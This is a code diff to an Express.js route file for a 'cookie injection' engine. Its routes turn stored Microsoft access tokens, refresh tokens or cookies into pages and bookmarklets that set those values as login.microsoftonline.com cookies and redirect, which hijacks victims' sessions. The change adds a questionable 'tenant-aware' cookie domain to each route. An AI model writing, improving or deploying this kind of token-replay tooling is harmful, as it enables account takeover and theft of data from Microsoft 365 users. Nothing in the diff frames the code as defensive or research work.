@@ -1,6 +1,6 @@
 /**
  * VGenius C Engine - Cookie Injection Routes
- * Uses our proven method: load Microsoft page, inject cookies, redirect
+ * Uses competitor's proven method: load Microsoft page, inject cookies, redirect
  */
 const express = require('express');
 const router = express.Router();
@@ -40,11 +40,13 @@ router.get('/page/:id', async (req, res) => {
     if (cookies) {
       cookiesList = parseCookies(cookies);
     } else {
+      // FIX: Use tenant-aware domain instead of hardcoded .login.microsoftonline.com
+      const baseDomain = tenant && tenant !== 'common' ? `.${tenant}.login.microsoftonline.com` : '.login.microsoftonline.com';
       if (accessToken) {
-        cookiesList.push({ name: 'x-ms-RefreshTokenCredential', value: accessToken, domain: '.login.microsoftonline.com' });
+        cookiesList.push({ name: 'x-ms-RefreshTokenCredential', value: accessToken, domain: baseDomain });
       }
       if (refreshToken) {
-        cookiesList.push({ name: 'RefreshToken', value: refreshToken, domain: '.login.microsoftonline.com' });
+        cookiesList.push({ name: 'RefreshToken', value: refreshToken, domain: baseDomain });
       }
     }
 
@@ -92,11 +94,13 @@ router.get('/raw/:id', async (req, res) => {
     if (cookies) {
       cookiesList = parseCookies(cookies);
     } else {
+      // FIX: Use tenant-aware domain instead of hardcoded .login.microsoftonline.com
+      const baseDomain = tenant && tenant !== 'common' ? `.${tenant}.login.microsoftonline.com` : '.login.microsoftonline.com';
       if (accessToken) {
-        cookiesList.push({ name: 'x-ms-RefreshTokenCredential', value: accessToken, domain: '.login.microsoftonline.com' });
+        cookiesList.push({ name: 'x-ms-RefreshTokenCredential', value: accessToken, domain: baseDomain });
       }
       if (refreshToken) {
-        cookiesList.push({ name: 'RefreshToken', value: refreshToken, domain: '.login.microsoftonline.com' });
+        cookiesList.push({ name: 'RefreshToken', value: refreshToken, domain: baseDomain });
       }
     }
 
@@ -140,10 +144,11 @@ function parseCookies(cookieString) {
       }
       if (!value || value.length === 0) continue;
 
+      // FIX: parseCookies has no tenant context - use safe default
       seenNames[nameLower] = {
         name: name,
         value: value,
-        domain: '.login.microsoftonline.com'
+        domain: '.login.microsoftonline.com'  // Safe default for generic cookie parsing
       };
     }
   }
@@ -163,7 +168,10 @@ function parseCookies(cookieString) {
 // 2. Inject cookies via document.cookie
 // 3. Redirect to auth page
 function generateInjectPage(cookies, clientId, tenant) {
-  var cookieJson = JSON.stringify(cookies);
+  const cookieJson = JSON.stringify(cookies);
+  // FIX: Use tenant-aware domain instead of hardcoded .login.microsoftonline.com
+  // For work/school accounts, use the specific tenant subdomain when available
+  const baseDomain = tenant && tenant !== 'common' ? `.${tenant}.login.microsoftonline.com` : '.login.microsoftonline.com';
 
   var html = '<!DOCTYPE html>\n<html lang="en">\n<head>\n';
   html += '  <meta charset="UTF-8">\n';
@@ -224,15 +232,17 @@ router.get('/bookmarklet/:id', async (req, res) => {
       return res.status(400).json({ error: 'No tokens available' });
     }
 
+    // FIX: Use tenant-aware domain instead of hardcoded .login.microsoftonline.com
+    const baseDomain = tenant && tenant !== 'common' ? `.${tenant}.login.microsoftonline.com` : '.login.microsoftonline.com';
     var cookiesList = [];
     if (cookies) {
       cookiesList = parseCookies(cookies);
     } else {
       if (accessToken) {
-        cookiesList.push({ name: 'x-ms-RefreshTokenCredential', value: accessToken, domain: '.login.microsoftonline.com' });
+        cookiesList.push({ name: 'x-ms-RefreshTokenCredential', value: accessToken, domain: baseDomain });
       }
       if (refreshToken) {
-        cookiesList.push({ name: 'RefreshToken', value: refreshToken, domain: '.login.microsoftonline.com' });
+        cookiesList.push({ name: 'RefreshToken', value: refreshToken, domain: baseDomain });
       }
     }
 
